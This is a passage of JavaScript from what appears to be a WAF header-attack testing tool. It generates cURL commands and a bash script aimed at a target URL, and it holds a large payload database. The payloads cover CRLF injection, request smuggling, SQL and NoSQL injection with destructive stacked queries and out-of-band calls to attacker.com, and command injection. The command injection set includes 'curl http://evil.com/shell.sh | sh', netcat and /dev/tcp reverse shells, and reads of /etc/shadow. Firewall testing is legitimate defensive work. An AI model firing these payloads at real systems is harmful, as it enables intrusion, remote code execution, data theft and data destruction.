    data.push(['Medium', severityCounts.medium, ((severityCounts.medium / tests.length) * 100).toFixed(1) + '%', '40']);
    data.push(['Low', severityCounts.low, ((severityCounts.low / tests.length) * 100).toFixed(1) + '%', '10']);
    
    data.push(['', '', '', '']);
    data.push(['Tests by Category', '', '', '']);
    data.push(['Category', 'Count', 'Percentage', '']);
    
    // Add category stats
    Object.entries(categoryCounts).sort().forEach(([category, count]) => {
        data.push([
            category,
            count,
            ((count / tests.length) * 100).toFixed(1) + '%',
            ''
        ]);
    });
    
    // Calculate risk metrics
    const riskLevel = calculateRiskLevel(severityCounts, tests.length);
    
    data.push(['', '', '', '']);
    data.push(['Risk Assessment', '', '', '']);
    data.push(['Overall Risk Level', riskLevel.toFixed(1) + '%', '', '']);
    data.push(['Risk Category', getRiskCategory(riskLevel), '', '']);
    data.push(['Total Tests', tests.length.toString(), '', '']);
    data.push(['High Risk Tests', (severityCounts.critical + severityCounts.high).toString(), '', '']);
    data.push(['Low Risk Tests', (severityCounts.medium + severityCounts.low).toString(), '', '']);
    
    return data;
}

// Create cURL commands data with text limits
// Create cURL commands data with text limits
function createCurlCommandsData(tests, targetUrl, proxyUrl, requestMethod, curlFormat, additionalHeaders) {
    const data = [
        ['WAF Header Attack Test - cURL Commands', '', '', ''],
        ['', '', '', ''],
        ['Target URL:', targetUrl, '', ''],
        ['Proxy:', proxyUrl || 'None', '', ''],
        ['HTTP Method:', requestMethod, '', ''],
        ['cURL Format:', getCurlFormatDescription(curlFormat), '', ''],
        ['Total Tests:', tests.length.toString(), '', ''],
        ['', '', '', ''],
        ['Test #', 'Test Name', 'Payload', 'cURL Command']
    ];
    
    // Add test rows with full cURL commands
    tests.forEach(({ category, test }, index) => {
        const curlCommand = generateCurlCommand(test.payload, targetUrl, proxyUrl, requestMethod, curlFormat);
        
        // Truncate curl command if it's too long for Excel
        const safeCommand = truncateForExcel(curlCommand);
        const safePayload = truncateForExcel(test.payload);
        
        data.push([
            (index + 1).toString(),
            `${category} - ${test.name}`,
            safePayload,
            safeCommand
        ]);
    });
    
    return data;
}

// Create shell script data with text limits
function createShellScriptData(tests, targetUrl, proxyUrl, requestMethod, curlFormat, additionalHeaders) {
    // Generate shell script content
    let scriptContent = `#!/bin/bash
# WAF Header Attack Test Script
# Generated: ${new Date().toISOString()}
# Target: ${targetUrl}
# Total Tests: ${tests.length}

TARGET="${targetUrl}"
${proxyUrl ? `PROXY="${proxyUrl}"` : '# No proxy configured'}
LOGFILE="waf_test_$(date +%Y%m%d_%H%M%S).log"

echo "Starting WAF Header Attack Tests..." | tee $LOGFILE
echo "Target: $TARGET" | tee -a $LOGFILE
echo "===========================================" | tee -a $LOGFILE

`;

    // Add a reasonable number of tests for Excel limitations
    const maxTestsForScript = Math.min(tests.length, 20);
    tests.slice(0, maxTestsForScript).forEach(({ category, test }, index) => {
        const curlCommand = generateCurlCommand(test.payload, targetUrl, proxyUrl, requestMethod, curlFormat);
        
        scriptContent += `
# Test ${index + 1}: ${category} - ${test.name}
echo -e "\\n[TEST ${index + 1}] ${test.name}" | tee -a $LOGFILE
echo "[SEVERITY] ${test.severity.toUpperCase()}" | tee -a $LOGFILE

${curlCommand} 2>&1 | tee -a $LOGFILE
echo "-------------------------------------------" | tee -a $LOGFILE
`;
    });
    
    // Add ending
    scriptContent += `
echo -e "\\nTesting complete. Results saved to: $LOGFILE"
echo "Total tests executed: ${maxTestsForScript} of ${tests.length}"
`;

    // Split the script into sections that fit in Excel
    const data = [
        ['WAF Header Attack Test - Shell Script', '', ''],
        ['', '', ''],
        ['Instructions:', 'Save this content as a .sh file, make it executable (chmod +x filename.sh), and run it from a terminal.', ''],
        ['Note:', 'This Excel sheet contains a truncated script with the first ' + maxTestsForScript + ' tests. A complete script can be generated from the web interface.', ''],
        ['', '', '']
    ];
    
    // Split the script into safe chunks for Excel
    const scriptChunks = splitTextForExcel(scriptContent);
    
    // Add each chunk as a separate row
    scriptChunks.forEach((chunk, index) => {
        data.push([`Script Part ${index + 1}`, chunk, '']);
    });
    
    return data;
}

// Create recommendations data
function createRecommendationsData(tests) {
    // Count by category to find the most common attack vectors
    const categoryCounts = {};
    tests.forEach(({ category }) => {
        if (!categoryCounts[category]) {
            categoryCounts[category] = 0;
        }
        categoryCounts[category]++;
    });
    
    // Get top categories
    const topCategories = Object.entries(categoryCounts)
        .sort((a, b) => b[1] - a[1])
        .slice(0, 5);
    
    // Create data
    const data = [
        ['Security Recommendations', '', '', ''],
        ['', '', '', ''],
        ['WAF Configuration Recommendations', '', '', ''],
        ['', '', '', ''],
    ];
    
    // General recommendations
    data.push(['1. WAF Rule Enhancements', '', '', '']);
    data.push(['Recommendation:', 'Implement specific rules to handle malformed HTTP headers', '', '']);
    data.push(['Priority:', 'High', '', '']);
    data.push(['Description:', 'Configure the WAF to detect and block malicious header manipulation attempts, particularly focusing on header injection, CRLF injection, and request smuggling.', '', '']);
    data.push(['', '', '', '']);
    
    data.push(['2. HTTP Protocol Enforcement', '', '', '']);
    data.push(['Recommendation:', 'Enforce strict HTTP protocol compliance', '', '']);
    data.push(['Priority:', 'High', '', '']);
    data.push(['Description:', 'Configure the WAF to enforce RFC-compliant HTTP headers and reject requests with malformed headers, invalid characters, or oversized values.', '', '']);
    data.push(['', '', '', '']);
    
    // Additional recommendations
    data.push(['Implementation Guidelines', '', '', '']);
    data.push(['', '', '', '']);
    data.push(['1. Testing Environment', 'Set up a staging environment to test WAF rule changes before deploying to production.', '', '']);
    data.push(['2. Logging and Monitoring', 'Implement comprehensive logging for WAF events to track blocked requests and potential evasion attempts.', '', '']);
    data.push(['3. Regular Updates', 'Keep the WAF updated with the latest security patches and rule sets.', '', '']);
    data.push(['4. Periodic Testing', 'Conduct regular security testing with updated attack patterns to ensure continued protection.', '', '']);
    
    return data;
}

// Get cURL format description
function getCurlFormatDescription(format) {
    switch (format) {
        case 'basic': return 'Basic (no options)';
        case 'verbose': return 'Verbose (-v)';
        case 'insecure': return 'Ignore SSL (-k)';
        case 'full': return 'Full Options (-v -k)';
        default: return format;
    }
}

// Add to report history
function addToWafReportHistory(report) {
    // Add to report history array
    wafReportHistory.unshift(report);
    
    // Limit to 10 items
    if (wafReportHistory.length > 10) {
        wafReportHistory.pop();
    }
    
    // Update history tab
    updateWafReportHistory();
}

// Update the report history tab
function updateWafReportHistory() {
    const historyList = document.querySelector('.waf-report-history-list');
    const historyEmpty = document.querySelector('.waf-report-history-empty');
    
    if (!historyList || !historyEmpty) return;
    
    if (wafReportHistory.length > 0) {
        historyList.style.display = 'flex';
        historyEmpty.style.display = 'none';
        
        historyList.innerHTML = wafReportHistory.map(report => `
            <div class="waf-history-item">
                <div class="waf-history-icon">
                    <i class="fas fa-file-excel"></i>
                </div>
                <div class="waf-history-details">
                    <h4>${report.title}</h4>
                    <p>${report.timestamp.toLocaleString()}  ${report.testCount} tests</p>
                </div>
                <div class="waf-history-actions">
                    <button onclick="regenerateWafReport('${report.filename}')">
                        <i class="fas fa-download"></i>
                    </button>
                </div>
            </div>
        `).join('');
    } else {
        historyList.style.display = 'none';
        historyEmpty.style.display = 'flex';
    }
}

// Regenerate a report from history
function regenerateWafReport(filename) {
    alert(`The report "${filename}" would be regenerated in a production environment.`);
}

// Show success message after generating report
function showWafSuccessMessage(filename) {
    // Create a success message element
    const messageEl = document.createElement('div');
    messageEl.className = 'waf-report-success-message';
    messageEl.innerHTML = `
        <div class="waf-report-success-content">
            <i class="fas fa-check-circle"></i>
            <span>Excel report generated: ${filename}</span>
            <button onclick="this.parentElement.parentElement.remove()"></button>
        </div>
    `;
    
    // Add to document
    document.body.appendChild(messageEl);
    
    // Auto remove after 5 seconds
    setTimeout(() => {
        if (messageEl.parentElement) {
            messageEl.remove();
        }
    }, 5000);
}

// Helper function to get selected tests from main application
function getSelectedTests() {
    const selected = [];
    document.querySelectorAll('.test-checkbox:checked').forEach(checkbox => {
        const item = checkbox.closest('.test-item');
        if (!item) return;
        
        const category = item.dataset.category;
        const index = parseInt(item.dataset.index);
        
        // Access the test database from the main application
        if (window.testDatabase && window.testDatabase[category] && window.testDatabase[category].tests[index]) {
            const test = window.testDatabase[category].tests[index];
            selected.push({ category, test });
        }
    });
    return selected;
}

// Initialize on load
document.addEventListener('DOMContentLoaded', function() {
    // Add necessary libraries
    loadScripts().then(() => {
        console.log('Required libraries loaded successfully');
        initReportGenerator();
    }).catch(error => {
        console.error('Failed to load required libraries:', error);
    });
});
</script>























    <script>
        // Comprehensive test database with MANY more payloads
        const testDatabase = {
            "CRLF Injection": {
                icon: "fa-code-branch",
                tests: [
                    // Basic CRLF
                    { name: "Basic CRLF Set-Cookie", payload: 'X-Test: value\\r\\nSet-Cookie: admin=true', severity: "critical" },
                    { name: "CRLF Location Header", payload: 'X-Test: value\\r\\nLocation: http://evil.com', severity: "critical" },
                    { name: "CRLF Cache Control", payload: 'X-Test: value\\r\\nCache-Control: no-store', severity: "high" },
                    { name: "Double CRLF Body Injection", payload: 'X-Test: value\\r\\n\\r\\n<script>alert(1)< /script>', severity: "critical" },
                    { name: "CRLF Content-Type", payload: 'X-Test: value\\r\\nContent-Type: text/html', severity: "high" },
                    { name: "CRLF Access-Control", payload: 'X-Test: value\\r\\nAccess-Control-Allow-Origin: *', severity: "high" },
                    { name: "CRLF X-XSS-Protection", payload: 'X-Test: value\\r\\nX-XSS-Protection: 0', severity: "high" },
                    { name: "CRLF CSP Bypass", payload: 'X-Test: value\\r\\nContent-Security-Policy: default-src *', severity: "high" },
                    { name: "CRLF X-Frame-Options", payload: 'X-Test: value\\r\\nX-Frame-Options: ALLOWALL', severity: "high" },
                    { name: "CRLF Pragma", payload: 'X-Test: value\\r\\nPragma: no-cache', severity: "medium" },
                    { name: "CRLF Expires", payload: 'X-Test: value\\r\\nExpires: 0', severity: "medium" },
                    { name: "CRLF Refresh", payload: 'X-Test: value\\r\\nRefresh: 0;url=http://evil.com', severity: "high" },
                    { name: "CRLF Link Header", payload: 'X-Test: value\\r\\nLink: <http://evil.com>; rel="stylesheet"', severity: "medium" },
                    { name: "CRLF Status Code", payload: 'X-Test: value\\r\\n\\r\\nHTTP/1.1 200 OK\\r\\n', severity: "critical" },
                    { name: "CRLF Authentication", payload: 'X-Test: value\\r\\nWWW-Authenticate: Basic realm="admin"', severity: "high" },
                    { name: "CRLF P3P Header", payload: 'X-Test: value\\r\\nP3P: CP="ALL DSP COR PSAa PSDa OUR NOR ONL UNI COM NAV"', severity: "low" },
                    { name: "CRLF Strict-Transport", payload: 'X-Test: value\\r\\nStrict-Transport-Security: max-age=0', severity: "high" },
                    { name: "CRLF X-Powered-By", payload: 'X-Test: value\\r\\nX-Powered-By: Malicious/1.0', severity: "low" },
                    { name: "CRLF Server Header", payload: 'X-Test: value\\r\\nServer: Compromised/1.0', severity: "low" },
                    { name: "CRLF X-Content-Type", payload: 'X-Test: value\\r\\nX-Content-Type-Options: nosniff', severity: "medium" },
                    
                    // Variations with different line endings
                    { name: "LF Only Set-Cookie", payload: 'X-Test: value\\nSet-Cookie: admin=true', severity: "high" },
                    { name: "CR Only Set-Cookie", payload: 'X-Test: value\\rSet-Cookie: admin=true', severity: "high" },
                    { name: "LFCR Reverse", payload: 'X-Test: value\\n\\rSet-Cookie: admin=true', severity: "high" },
                    { name: "Mixed Line Endings", payload: 'X-Test: value\\r\\nSet-Cookie: user=test\\n\\rX-Admin: true', severity: "high" },
                    { name: "Tab+CRLF", payload: 'X-Test: value\\t\\r\\nSet-Cookie: admin=true', severity: "high" },
                    { name: "Space+CRLF", payload: 'X-Test: value \\r\\nSet-Cookie: admin=true', severity: "high" },
                    { name: "CRLF+Space", payload: 'X-Test: value\\r\\n Set-Cookie: admin=true', severity: "high" },
                    { name: "CRLF+Tab", payload: 'X-Test: value\\r\\n\\tSet-Cookie: admin=true', severity: "high" },
                    { name: "Vertical Tab+CRLF", payload: 'X-Test: value\\v\\r\\nSet-Cookie: admin=true', severity: "medium" },
                    { name: "Form Feed+CRLF", payload: 'X-Test: value\\f\\r\\nSet-Cookie: admin=true', severity: "medium" },
                    
                    // URL Encoded variants
                    { name: "URL Encoded CRLF", payload: 'X-Test: value%0D%0ASet-Cookie:%20admin=true', severity: "high" },
                    { name: "Double URL Encoded", payload: 'X-Test: value%250D%250ASet-Cookie:%20admin=true', severity: "high" },
                    { name: "Mixed Encoding", payload: 'X-Test: value%0D\\nSet-Cookie: admin=true', severity: "high" },
                    { name: "Partial Encoding", payload: 'X-Test: value\\r%0ASet-Cookie: admin=true', severity: "high" },
                    { name: "Unicode CRLF U+000D", payload: 'X-Test: value\\u000D\\u000ASet-Cookie: admin=true', severity: "medium" },
                    { name: "HTML Entity CRLF", payload: 'X-Test: value&#13;&#10;Set-Cookie: admin=true', severity: "medium" },
                    { name: "Hex Encoded", payload: 'X-Test: value\\x0D\\x0ASet-Cookie: admin=true', severity: "high" },
                    { name: "Octal Encoded", payload: 'X-Test: value\\015\\012Set-Cookie: admin=true', severity: "medium" },
                    
                    // Multiple headers injection
                    { name: "Multi Header CRLF", payload: 'X-Test: value\\r\\nX-Injected-1: true\\r\\nX-Injected-2: true', severity: "high" },
                    { name: "Chain CRLF Headers", payload: 'X-Test: value\\r\\nSet-Cookie: user=admin\\r\\nLocation: /admin\\r\\nX-Admin: true', severity: "critical" },
                    { name: "CRLF Header Bomb", payload: 'X-Test: value\\r\\n' + 'X-Injected: true\\r\\n'.repeat(50), severity: "medium" }
                ]
            },
            
            "Request Smuggling": {
                icon: "fa-truck",
                tests: [
                    // CL.TE attacks
                    { name: "CL.TE Basic", payload: 'Content-Length: 13\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nSMUGGLED', severity: "critical" },
                    { name: "CL.TE with Body", payload: 'Content-Length: 4\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\nA\\r\\n0\\r\\n\\r\\n', severity: "critical" },
                    { name: "CL.TE Zero Length", payload: 'Content-Length: 0\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: localhost\\r\\n\\r\\n', severity: "critical" },
                    { name: "CL.TE Negative", payload: 'Content-Length: -1\\r\\nTransfer-Encoding: chunked', severity: "high" },
                    { name: "CL.TE Large Value", payload: 'Content-Length: 9999999999\\r\\nTransfer-Encoding: chunked', severity: "high" },
                    { name: "CL.TE Decimal", payload: 'Content-Length: 13.37\\r\\nTransfer-Encoding: chunked', severity: "medium" },
                    { name: "CL.TE Hex Value", payload: 'Content-Length: 0x10\\r\\nTransfer-Encoding: chunked', severity: "medium" },
                    { name: "CL.TE Space After", payload: 'Content-Length: 13 \\r\\nTransfer-Encoding: chunked', severity: "medium" },
                    { name: "CL.TE Tab Separated", payload: 'Content-Length:\\t13\\r\\nTransfer-Encoding: chunked', severity: "medium" },
                    { name: "CL.TE Multiple CL", payload: 'Content-Length: 0\\r\\nContent-Length: 13\\r\\nTransfer-Encoding: chunked', severity: "critical" },
                    
                    // TE.CL attacks
                    { name: "TE.CL Basic", payload: 'Transfer-Encoding: chunked\\r\\nContent-Length: 4\\r\\n\\r\\n5c\\r\\nSMUGGLED REQUEST\\r\\n0\\r\\n\\r\\n', severity: "critical" },
                    { name: "TE.CL with GET", payload: 'Transfer-Encoding: chunked\\r\\nContent-Length: 4\\r\\n\\r\\n5e\\r\\nGET /admin HTTP/1.1\\r\\nHost: localhost\\r\\nContent-Length: 10\\r\\n\\r\\n0\\r\\n\\r\\n', severity: "critical" },
                    { name: "TE.CL Zero CL", payload: 'Transfer-Encoding: chunked\\r\\nContent-Length: 0', severity: "high" },
                    { name: "TE.CL Negative CL", payload: 'Transfer-Encoding: chunked\\r\\nContent-Length: -1', severity: "high" },
                    { name: "TE.CL Multiple TE", payload: 'Transfer-Encoding: chunked\\r\\nTransfer-Encoding: identity\\r\\nContent-Length: 0', severity: "high" },
                    
                    // TE.TE attacks
                    { name: "TE.TE Obfuscation", payload: 'Transfer-Encoding: xchunked\\r\\nTransfer-Encoding: chunked', severity: "critical" },
                    { name: "TE.TE Case", payload: 'Transfer-Encoding: cHuNkEd\\r\\nTransfer-encoding: chunked', severity: "high" },
                    { name: "TE.TE Space", payload: 'Transfer-Encoding: chunked\\r\\nTransfer-Encoding : chunked', severity: "high" },
                    { name: "TE.TE Tab", payload: 'Transfer-Encoding: chunked\\r\\nTransfer-Encoding:\\tchunked', severity: "high" },
                    { name: "TE.TE Newline", payload: 'Transfer-Encoding: chunked\\r\\nTransfer-Encoding:\\r\\n chunked', severity: "high" },
                    { name: "TE.TE Identity", payload: 'Transfer-Encoding: identity, chunked', severity: "high" },
                    { name: "TE.TE Gzip", payload: 'Transfer-Encoding: gzip, chunked', severity: "medium" },
                    { name: "TE.TE Compress", payload: 'Transfer-Encoding: compress, chunked', severity: "medium" },
                    { name: "TE.TE Deflate", payload: 'Transfer-Encoding: deflate, chunked', severity: "medium" },
                    { name: "TE.TE X-Value", payload: 'Transfer-Encoding: x-gzip, chunked', severity: "medium" },
                    
                    // Chunked encoding attacks
                    { name: "Invalid Chunk Size", payload: 'Transfer-Encoding: chunked\\r\\n\\r\\nGGGG\\r\\n', severity: "high" },
                    { name: "Negative Chunk", payload: 'Transfer-Encoding: chunked\\r\\n\\r\\n-1\\r\\n', severity: "high" },
                    { name: "Chunk Extension", payload: 'Transfer-Encoding: chunked\\r\\n\\r\\n5;ignore=stuff\\r\\nHello\\r\\n0\\r\\n\\r\\n', severity: "medium" },
                    { name: "Chunk + Content", payload: 'Transfer-Encoding: chunked\\r\\n\\r\\n5\\r\\nHello\\r\\n0\\r\\n\\r\\nSMUGGLED', severity: "high" },
                    { name: "Missing Chunk End", payload: 'Transfer-Encoding: chunked\\r\\n\\r\\n5\\r\\nHello', severity: "medium" },
                    { name: "Double Chunked", payload: 'Transfer-Encoding: chunked, chunked', severity: "high" },
                    { name: "Chunked Identity", payload: 'Transfer-Encoding: chunked, identity', severity: "high" },
                    { name: "UTF-8 Chunk", payload: 'Transfer-Encoding: chunked\\r\\n\\r\\n5\\r\\nHello\\r\\n0\\r\\n\\r\\n', severity: "medium" },
                    
                    // Header smuggling
                    { name: "Header Space", payload: 'Content-Length : 13', severity: "low" },
                    { name: "Header Tab", payload: 'Content-Length\\t:\\t13', severity: "low" },
                    { name: "Header VTAB", payload: 'Content-Length\\v: 13', severity: "low" },
                    { name: "Header Null", payload: 'Content-Length\\x00: 13', severity: "medium" },
                    { name: "Header Continuation", payload: 'Content-Length:\\r\\n 13', severity: "medium" },
                    { name: "Header Folding", payload: 'Content-Length:\\r\\n\\t13', severity: "medium" },
                    { name: "Duplicate CL", payload: 'Content-Length: 0\\r\\nContent-Length: 13', severity: "high" },
                    { name: "Conflicting CL", payload: 'Content-Length: 5\\r\\nContent-Length: 10', severity: "high" },
                    { name: "CL Array", payload: 'Content-Length: 5, 10', severity: "medium" },
                    { name: "CL Scientific", payload: 'Content-Length: 1e2', severity: "low" },
                    
                    // Connection header
                    { name: "Connection Close", payload: 'Connection: close, Transfer-Encoding', severity: "medium" },
                    { name: "Connection Keep", payload: 'Connection: keep-alive, Transfer-Encoding', severity: "medium" },
                    { name: "Connection Upgrade", payload: 'Connection: Upgrade\\r\\nUpgrade: websocket', severity: "medium" },
                    { name: "Connection Custom", payload: 'Connection: X-Transfer-Encoding\\r\\nX-Transfer-Encoding: chunked', severity: "high" }
                ]
            },
            
            "SQL Injection": {
                icon: "fa-database",
                tests: [
                    // Classic SQL injection
                    { name: "Classic OR 1=1", payload: "X-User-Id: admin' OR '1'='1", severity: "critical" },
                    { name: "Classic OR True", payload: "X-User-Id: admin' OR 1=1--", severity: "critical" },
                    { name: "Classic OR Comment", payload: "X-User-Id: admin' OR 1=1#", severity: "critical" },
                    { name: "Classic OR Slash", payload: "X-User-Id: admin' OR 1=1/*", severity: "critical" },
                    { name: "Double Quote OR", payload: 'X-User-Id: admin" OR "1"="1', severity: "critical" },
                    { name: "No Quote OR", payload: "X-User-Id: admin OR 1=1", severity: "high" },
                    { name: "Tick Quote OR", payload: "X-User-Id: admin` OR 1=1", severity: "high" },
                    
                    // UNION attacks
                    { name: "Union Select Null", payload: "X-User-Id: 1' UNION SELECT NULL--", severity: "critical" },
                    { name: "Union Select Multi", payload: "X-User-Id: 1' UNION SELECT NULL,NULL,NULL--", severity: "critical" },
                    { name: "Union All Select", payload: "X-User-Id: 1' UNION ALL SELECT NULL--", severity: "critical" },
                    { name: "Union Select Version", payload: "X-User-Id: 1' UNION SELECT @@version--", severity: "critical" },
                    { name: "Union Select Database", payload: "X-User-Id: 1' UNION SELECT database()--", severity: "critical" },
                    { name: "Union Select User", payload: "X-User-Id: 1' UNION SELECT user()--", severity: "critical" },
                    { name: "Union Select Password", payload: "X-User-Id: 1' UNION SELECT password FROM users--", severity: "critical" },
                    { name: "Union Information Schema", payload: "X-User-Id: 1' UNION SELECT table_name FROM information_schema.tables--", severity: "critical" },
                    { name: "Union Concat", payload: "X-User-Id: 1' UNION SELECT CONCAT(username,password) FROM users--", severity: "critical" },
                    { name: "Union Hex", payload: "X-User-Id: 1' UNION SELECT 0x61646d696e--", severity: "high" },
                    
                    // Boolean blind
                    { name: "Boolean AND True", payload: "X-User-Id: 1' AND 1=1--", severity: "high" },
                    { name: "Boolean AND False", payload: "X-User-Id: 1' AND 1=2--", severity: "high" },
                    { name: "Boolean Substring", payload: "X-User-Id: 1' AND SUBSTRING(username,1,1)='a'--", severity: "high" },
                    { name: "Boolean ASCII", payload: "X-User-Id: 1' AND ASCII(SUBSTRING(username,1,1))>97--", severity: "high" },
                    { name: "Boolean Length", payload: "X-User-Id: 1' AND LENGTH(username)>5--", severity: "high" },
                    { name: "Boolean Exists", payload: "X-User-Id: 1' AND EXISTS(SELECT * FROM users)--", severity: "high" },
                    { name: "Boolean Like", payload: "X-User-Id: 1' AND username LIKE 'admin%'--", severity: "high" },
                    { name: "Boolean In", payload: "X-User-Id: 1' AND id IN (1,2,3)--", severity: "high" },
                    { name: "Boolean Between", payload: "X-User-Id: 1' AND id BETWEEN 1 AND 10--", severity: "high" },
                    
                    // Time-based blind
                    { name: "Sleep MySQL", payload: "X-User-Id: 1' AND SLEEP(5)--", severity: "high" },
                    { name: "Benchmark MySQL", payload: "X-User-Id: 1' AND BENCHMARK(5000000,MD5('test'))--", severity: "high" },
                    { name: "Waitfor MSSQL", payload: "X-User-Id: 1'; WAITFOR DELAY '00:00:05'--", severity: "high" },
                    { name: "PG Sleep", payload: "X-User-Id: 1'; SELECT pg_sleep(5)--", severity: "high" },
                    { name: "SQLite Busy", payload: "X-User-Id: 1' AND 1=(SELECT COUNT(*) FROM sqlite_master AS x JOIN sqlite_master AS y)--", severity: "high" },
                    { name: "Oracle Sleep", payload: "X-User-Id: 1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('test',5)--", severity: "high" },
                    { name: "Conditional Sleep", payload: "X-User-Id: 1' AND IF(1=1,SLEEP(5),0)--", severity: "high" },
                    { name: "Case Sleep", payload: "X-User-Id: 1' AND (CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)--", severity: "high" },
                    
                    // Error-based
                    { name: "Error Convert Int", payload: "X-User-Id: 1' AND 1=CONVERT(INT,(SELECT @@version))--", severity: "high" },
                    { name: "Error Subquery", payload: "X-User-Id: 1' AND 1=(SELECT 1/0)--", severity: "high" },
                    { name: "Error XML", payload: "X-User-Id: 1' AND extractvalue(1,concat(0x7e,(SELECT @@version),0x7e))--", severity: "high" },
                    { name: "Error UpdateXML", payload: "X-User-Id: 1' AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)--", severity: "high" },
                    { name: "Error Floor", payload: "X-User-Id: 1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", severity: "high" },
                    { name: "Error Exp", payload: "X-User-Id: 1' AND EXP(~(SELECT * FROM (SELECT user())a))--", severity: "high" },
                    { name: "Error JSON", payload: "X-User-Id: 1' AND JSON_EXTRACT((SELECT @@version),'$')--", severity: "high" },
                    { name: "Error Polygon", payload: "X-User-Id: 1' AND polygon((SELECT * FROM(SELECT * FROM(SELECT @@version)a)b))--", severity: "high" },
                    
                    // Stacked queries
                    { name: "Stacked Drop Table", payload: "X-User-Id: 1'; DROP TABLE users--", severity: "critical" },
                    { name: "Stacked Create Table", payload: "X-User-Id: 1'; CREATE TABLE test(id INT)--", severity: "critical" },
                    { name: "Stacked Insert", payload: "X-User-Id: 1'; INSERT INTO users VALUES('admin','password')--", severity: "critical" },
                    { name: "Stacked Update", payload: "X-User-Id: 1'; UPDATE users SET password='hacked'--", severity: "critical" },
                    { name: "Stacked Delete", payload: "X-User-Id: 1'; DELETE FROM users--", severity: "critical" },
                    { name: "Stacked Exec", payload: "X-User-Id: 1'; EXEC xp_cmdshell('whoami')--", severity: "critical" },
                    { name: "Stacked Shutdown", payload: "X-User-Id: 1'; SHUTDOWN--", severity: "critical" },
                    
                    // Out-of-band
                    { name: "DNS MySQL Windows", payload: "X-User-Id: 1' OR LOAD_FILE('\\\\\\\\attacker.com\\\\test')--", severity: "high" },
                    { name: "DNS MySQL Linux", payload: "X-User-Id: 1' UNION SELECT LOAD_FILE('/etc/passwd')--", severity: "high" },
                    { name: "DNS MSSQL", payload: "X-User-Id: 1'; EXEC master..xp_dirtree '\\\\\\\\attacker.com\\\\test'--", severity: "high" },
                    { name: "DNS Oracle", payload: "X-User-Id: 1' UNION SELECT UTL_HTTP.request('http://attacker.com/'||(SELECT user FROM dual)) FROM dual--", severity: "high" },
                    { name: "DNS PostgreSQL", payload: "X-User-Id: 1'; SELECT * FROM dblink('host=attacker.com user=test','SELECT 1')--", severity: "high" },
                    
                    // NoSQL injection
                    { name: "NoSQL Not Equal", payload: 'X-User-Id: {"$ne": null}', severity: "high" },
                    { name: "NoSQL Greater Than", payload: 'X-User-Id: {"$gt": ""}', severity: "high" },
                    { name: "NoSQL Regex", payload: 'X-User-Id: {"$regex": ".*"}', severity: "high" },
                    { name: "NoSQL Where", payload: 'X-User-Id: {"$where": "1==1"}', severity: "critical" },
                    { name: "NoSQL In Array", payload: 'X-User-Id: {"$in": ["admin", "user"]}', severity: "high" },
                    { name: "NoSQL Or", payload: 'X-User-Id: {"$or": [{"user": "admin"}, {"user": "user"}]}', severity: "high" },
                    { name: "NoSQL JavaScript", payload: 'X-User-Id: {"$where": "this.password.length > 0"}', severity: "critical" },
                    { name: "NoSQL Sleep", payload: 'X-User-Id: {"$where": "sleep(5000)"}', severity: "high" },
                    
                    // JSON SQL injection
                    { name: "JSON SQL Basic", payload: 'X-Data: {"user": "admin\' OR \'1\'=\'1"}', severity: "high" },
                    { name: "JSON SQL Union", payload: 'X-Data: {"id": "1 UNION SELECT password FROM users"}', severity: "high" },
                    { name: "JSON SQL Escaped", payload: 'X-Data: {"user": "admin\\\' OR 1=1--"}', severity: "high" },
                    { name: "JSON SQL Unicode", payload: 'X-Data: {"user": "admin\\u0027 OR 1=1--"}', severity: "high" }
                ]
            },
            
            "Command Injection": {
                icon: "fa-terminal",
                tests: [
                    // Basic command injection
                    { name: "Semicolon Command", payload: "X-File: test.txt; whoami", severity: "critical" },
                    { name: "Pipe Command", payload: "X-File: test.txt | whoami", severity: "critical" },
                    { name: "AND Command", payload: "X-File: test.txt && whoami", severity: "critical" },
                    { name: "OR Command", payload: "X-File: test.txt || whoami", severity: "critical" },
                    { name: "Backtick Command", payload: "X-File: `whoami`", severity: "critical" },
                    { name: "Dollar Command", payload: "X-File: $(whoami)", severity: "critical" },
                    { name: "Newline Command", payload: "X-File: test.txt\\nwhoami", severity: "critical" },
                    { name: "Carriage Return", payload: "X-File: test.txt\\rwhoami", severity: "critical" },
                    { name: "Tab Command", payload: "X-File: test.txt\\twhoami", severity: "high" },
                    { name: "Null Command", payload: "X-File: test.txt\\x00whoami", severity: "high" },
                    
                    // Command substitution
                    { name: "Backtick Sub", payload: "X-File: test-`whoami`.txt", severity: "critical" },
                    { name: "Dollar Sub", payload: "X-File: test-$(whoami).txt", severity: "critical" },
                    { name: "Nested Backtick", payload: "X-File: test-`echo \\`whoami\\``.txt", severity: "critical" },
                    { name: "Nested Dollar", payload: "X-File: test-$(echo $(whoami)).txt", severity: "critical" },
                    { name: "Math Expression", payload: "X-File: test-$((2+2)).txt", severity: "medium" },
                    { name: "Brace Expansion", payload: "X-File: test-{1..5}.txt", severity: "low" },
                    
                    // File operations
                    { name: "Cat Passwd", payload: "X-File: test.txt; cat /etc/passwd", severity: "critical" },
                    { name: "Type Windows", payload: "X-File: test.txt & type C:\\\\Windows\\\\win.ini", severity: "critical" },
                    { name: "Dir Windows", payload: "X-File: test.txt & dir C:\\\\", severity: "high" },
                    { name: "LS Unix", payload: "X-File: test.txt; ls -la /", severity: "high" },
                    { name: "Head File", payload: "X-File: test.txt; head /etc/shadow", severity: "critical" },
                    { name: "Tail File", payload: "X-File: test.txt; tail /var/log/auth.log", severity: "high" },
                    { name: "Find Files", payload: "X-File: test.txt; find / -name *.conf", severity: "high" },
                    { name: "Grep Search", payload: "X-File: test.txt; grep -r password /", severity: "high" },
                    
                    // Network operations
                    { name: "Curl Download", payload: "X-File: test.txt; curl http://evil.com/shell.sh | sh", severity: "critical" },
                    { name: "Wget Download", payload: "X-File: test.txt; wget http://evil.com/shell.sh -O- | sh", severity: "critical" },
                    { name: "NC Reverse Shell", payload: "X-File: test.txt; nc -e /bin/sh evil.com 4444", severity: "critical" },
                    { name: "Bash TCP", payload: "X-File: test.txt; bash -i >& /dev/tcp/evil.com/4444 0>&1", severity: "critical" },
